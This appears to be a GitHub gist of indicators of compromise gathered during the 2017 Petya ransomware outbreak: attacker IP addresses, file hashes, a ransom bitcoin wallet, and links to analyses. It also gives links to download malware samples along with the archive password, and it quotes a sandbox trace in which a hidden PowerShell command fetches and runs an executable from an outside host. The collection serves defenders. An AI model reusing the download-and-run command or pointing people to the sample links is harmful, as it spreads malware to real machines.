@@ -1,0 +1,135 @@
+
+Got new info? Email at isox@vulners.com
+
+*********** Bitcoin wallet monitoring
+
+https://blockchain.info/address/1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
+
+*********** Possible malware files:
+https://yadi.sk/d/S0-ZhPY53KWc84
+https://yadi.sk/d/Zpkm88sp3KWc8v
+Archive password: virus
+
+*********** Possible IP addresses:
+185.165.29.78
+84.200.16.242
+111.90.139.247
+95.141.115.108
+
+*********** Malware dropped file:
+http://185.165.29.78/~alex/svchost.exe
+
+***********  Analysis:
+https://virustotal.com/fr/file/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745/analysis/
+https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100
+https://twitter.com/PolarToffee/status/879709615675641856
+
+***********  Vulnerabilities:
+https://vulners.com/search?query=ms17-010%20order:published
+ 
+*********** Hashes by codexgigas team:
+
+For 185.165.29.78, we have:
+
+a809a63bc5e31670ff117d838522dec433f74bee
+bec678164cedea578a7aff4589018fa41551c27f
+d5bf3f100e7dbcc434d7c58ebf64052329a60fc2
+aba7aa41057c8a6b184ba5776c20f7e8fc97c657
+0ff07caedad54c9b65e5873ac2d81b3126754aac
+51eafbb626103765d3aedfd098b94d0e77de1196
+078de2dc59ce59f503c63bd61f1ef8353dc7cf5f
+
+As droppers
+
+And for 84.200.16.242:
+
+7ca37b86f4acc702f108449c391dd2485b5ca18c
+2bc182f04b935c7e358ed9c9e6df09ae6af47168
+1b83c00143a1bb2bf16b46c01f36d53fb66f82b5
+82920a2ad0138a2a8efc744ae5849c6dde6b435d
+
+
+*********** Potential (IOC) (No proof!!!) by Ukraine researchers, received 27th morning
+- - - - - - - - - - - - - - - - - - - - - - -  - 
+
+File Name            Order-20062017.doc       (RTF із CVE-2017-0199)
+MD5 Hash Identifier       415FE69BF32634CA98FA07633F4118E1
+SHA-1 Hash Identifier     101CC1CB56C407D5B9149F2C3B8523350D23BA84
+SHA-256 Hash Identifier                FE2E5D0543B4C8769E401EC216D78A5A3547DFD426FD47E097DF04A5F7D6D206
+File Size                6215 bytes
+File Type              Rich Text Format data
+
+Connects to the host:
+
+84.200.16.242     80
+
+h11p://84.200.16.242/myguy.xls
+
+File Name            myguy.xls
+MD5 Hash Identifier       0487382A4DAF8EB9660F1C67E30F8B25
+SHA-1 Hash Identifier     736752744122A0B5EE4B95DDAD634DD225DC0F73
+SHA-256 Hash Identifier                EE29B9C01318A1E23836B949942DB14D4811246FDAE2F41DF9F0DCD922C63BC6
+File Size                13893 bytes
+File Type              Zip archive data
+
+mshta.exe %WINDIR%\System32\mshta.exe" "C:\myguy.xls.hta" " (PID: 2324)
+powershell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('h11p://french-cooking.com/myguy.exe', '%APPDATA%\10807.exe');" (PID: 2588, Additional Context: ( System.Net.WebClient).DownloadFile('h11p://french-cooking.com/myguy.exe', '%APPDATA%\10807.exe') ;)
+    10807.exe %APPDATA%\10807.exe" " (PID: 3096)
+
+File Name            BCA9D6.exe
+MD5 Hash Identifier       A1D5895F85751DFE67D19CCCB51B051A
+SHA-1 Hash Identifier     9288FB8E96D419586FC8C595DD95353D48E8A060
+SHA-256 Hash Identifier                17DACEDB6F0379A65160D73C0AE3AA1F03465AE75CB6AE754C7DCB3017AF1FBD
+File Size                275968 bytes
+
+
+!!!! Unproofed
+Connects to the host:
+
+111.90.139.247  80           
+COFFEINOFFICE.XYZ       80
+
+Pay attention - the trojan on which I give the markers could potentially be used to load the encryption part.
+
+
+*********** Has sysinternal utilities signature
+https://twitter.com/ppeepuppy/status/879706271535972353
+ 
+*********** Uses the The GetExtendedTcpTable function to get a list of available endpoints
+https://twitter.com/pjcampbe11/status/879709929073979392
+ 
+*********** List of extensions targeted
+https://twitter.com/MrCarlMcDade/status/879706580127809536
+
+*********** Indicates possible usage of PSEXEC, on windows that means the admin$ and c$ shares.
+https://twitter.com/rikvduijn/status/879726410201526272
+
+*********** It is confirmed that the sample 027cc... contains PSEXEC:
+https://twitter.com/NVISO_Labs/status/879724733696274432
+
+*********** Friends in Ukraine are telling me this helps to recover from Petya (untested):
+https://twitter.com/msuiche/status/879722894997278720
+bootrec /RebuildBcd
+bootrec /fixMbr
+bootrec /fixboot
+
+*********** Petya— Enhanced WannaCry? What we know so far.
+https://blog.comae.io/byata-enhanced-wannacry-a3ddd6c8dabb
+
+*********** Found evidences of post kernel exploitation too: IA32_SYSENTER_EIP after decoding kernel shellcode
+https://twitter.com/msuiche/status/879713211368525824
+
+***********  #Petya uses long #sleep functions: if infected you have 30-40 mins to turn off your computer to save it from ransom.
+https://twitter.com/GroupIB_GIB/status/879736598535032832
+
+@GuardaCyber
+
+Attach files by dragging & dropping,
+
+, or pasting from the clipboard.
+Styling with Markdown is supported
+
+    Contact GitHub API Training Shop Blog About 
+
+    © 2017 GitHub, Inc. Terms Privacy Security Status Help 
+
